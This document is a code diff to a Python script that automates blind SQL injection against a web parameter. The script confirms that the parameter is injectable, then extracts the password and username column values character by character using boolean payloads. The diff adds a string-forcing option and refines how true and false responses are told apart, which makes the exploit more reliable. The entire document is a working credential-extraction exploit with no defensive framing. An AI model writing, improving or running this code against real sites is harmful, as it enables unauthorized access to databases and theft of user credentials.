@@ -24,6 +24,7 @@ def remove_apostrophe(payload):
     if "'" in payload:
         new_payload = payload.replace("'","")
         return new_payload
+    return payload
 
 def is_numeric(value):
     try:
@@ -60,9 +61,9 @@ def test_for_sqli(target, param="id", value="1"):
     print("[-] Page is not vulnerable to SQL injection...")
     return False
 
-def test_condition(payload, target, param="id", value="1"):
+def test_condition(payload, target, param="id", value="1", force_string=False):
     # Determine if value is numeric
-    numeric = is_numeric(value)
+    numeric = is_numeric(value) and not force_string
 
     # Get response for the condition we're testing
     response = requests.get(target, headers=headers, params={param: f"{value}{payload}"})
@@ -90,20 +91,47 @@ def test_condition(payload, target, param="id", value="1"):
     diff_with_true = check_difference(true_text, test_text)
     is_different_from_true = is_page_different(diff_with_true)
 
+    print(f"    [*] is_different_from_false: {is_different_from_false}, is_different_from_true: {is_different_from_true}")
+
     # If test response is different from false but similar to true, condition is TRUE
     if is_different_from_false and not is_different_from_true:
+        print(f"    [*] Condition is TRUE (different from false, similar to true)")
         return True
 
+    # If test response is similar to false but different from true, condition is FALSE
+    if not is_different_from_false and is_different_from_true:
+        print(f"    [*] Condition is FALSE (similar to false, different from true)")
+        return False
+
+    # For numeric injection, might need to check baseline
+    baseline_response = requests.get(target, headers=headers, params={param: value})
+    baseline_text = baseline_response.text
+    diff_with_baseline = check_difference(baseline_text, test_text)
+    is_different_from_baseline = is_page_different(diff_with_baseline)
+
+    print(f"    [*] is_different_from_baseline: {is_different_from_baseline}")
+
+    # If similar to baseline, condition might be FALSE (original query unchanged)
+    if not is_different_from_baseline:
+        print(f"    [*] Condition is FALSE (similar to baseline)")
+        return False
+
+    # Default: if similar to true, return True
+    if not is_different_from_true:
+        print(f"    [*] Condition is TRUE (similar to true)")
+        return True
+
+    print(f"    [*] Condition is FALSE (default)")
     return False
 
-def find_password_length(value, param, target):
-    numeric = is_numeric(value)
+def find_password_length(value, param, target, force_string=False):
+    numeric = is_numeric(value) and not force_string
     for length in range(1, 1024):
         payload = f"' AND length(password)={length} -- -"
         if numeric:
             payload = remove_apostrophe(payload)
         print(f"[+] Testing on {target}?{param}={value}{payload}")
-        result = test_condition(payload, target, param, value)
+        result = test_condition(payload, target, param, value, force_string)
 
         if result:
             print(f"[+] Password length: {length}")
@@ -111,14 +139,14 @@ def find_password_length(value, param, target):
 
     return None
 
-def find_username_length(value, param, target):
-    numeric = is_numeric(value)
+def find_username_length(value, param, target, force_string=False):
+    numeric = is_numeric(value) and not force_string
     for length in range(1, 1024):
         payload = f"' AND length(username)={length} -- -"
         if numeric:
             payload = remove_apostrophe(payload)
         print(f"[+] Testing on {target}?{param}={value}{payload}")
-        result = test_condition(payload, target, param, value)
+        result = test_condition(payload, target, param, value, force_string)
 
         if result:
             print(f"[+] Username length: {length}")
@@ -126,14 +154,14 @@ def find_username_length(value, param, target):
 
     return None
 
-def find_character(value, position, target, param="id", field="password"):
-    numeric = is_numeric(value)
+def find_character(value, position, target, param="id", field="password", force_string=False):
+    numeric = is_numeric(value) and not force_string
     for char in charset:
         payload = f"' AND substring({field},{position},1)='{char}' -- -"
         if numeric:
             payload = remove_apostrophe(payload)
         print(f"[+] Testing condition on {target}?{param}={value}{payload}")
-        result = test_condition(payload, target, param, value)
+        result = test_condition(payload, target, param, value, force_string)
 
         if result:
             print(f"[+] Position {position}: {char}")
@@ -148,11 +176,13 @@ def main():
     parser.add_argument("--target", required=True)
     parser.add_argument("--value", required=True)
     parser.add_argument("--param", default="id")
+    parser.add_argument("--is-string", action="store_true", help="Force value to be treated as string (keeps apostrophes)")
     args = parser.parse_args()
 
     TARGET = args.target
     VALUE = args.value
     PARAM = args.param
+    FORCE_STRING = args.is_string
 
     if test_for_sqli(TARGET, PARAM, VALUE):
         print("[+] Continuing with exploitation...")
@@ -163,13 +193,13 @@ def main():
     username = ""
     password = ""
 
-    pass_length = find_password_length(VALUE, PARAM, TARGET)
+    pass_length = find_password_length(VALUE, PARAM, TARGET, FORCE_STRING)
     if pass_length is None:
         print("[-] Could not determine password length!")
         return
 
     for position in range(1, pass_length + 1):
-        char = find_character(VALUE, position, TARGET, PARAM, "password")
+        char = find_character(VALUE, position, TARGET, PARAM, "password", FORCE_STRING)
 
         if char is None:
             break
@@ -177,13 +207,13 @@ def main():
         password += char
         print(f"[+] Password so far: {password}")
 
-    user_length = find_username_length(VALUE, PARAM, TARGET)
+    user_length = find_username_length(VALUE, PARAM, TARGET, FORCE_STRING)
     if user_length is None:
         print("[-] Could not determine username length!")
         return
-    
+
     for position in range(1, user_length + 1):
-        char = find_character(VALUE, position, TARGET, PARAM, "username")
+        char = find_character(VALUE, position, TARGET, PARAM, "username", FORCE_STRING)
         username += char
         print(f"[+] Username so far: {username}")
 
@@ -192,4 +222,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
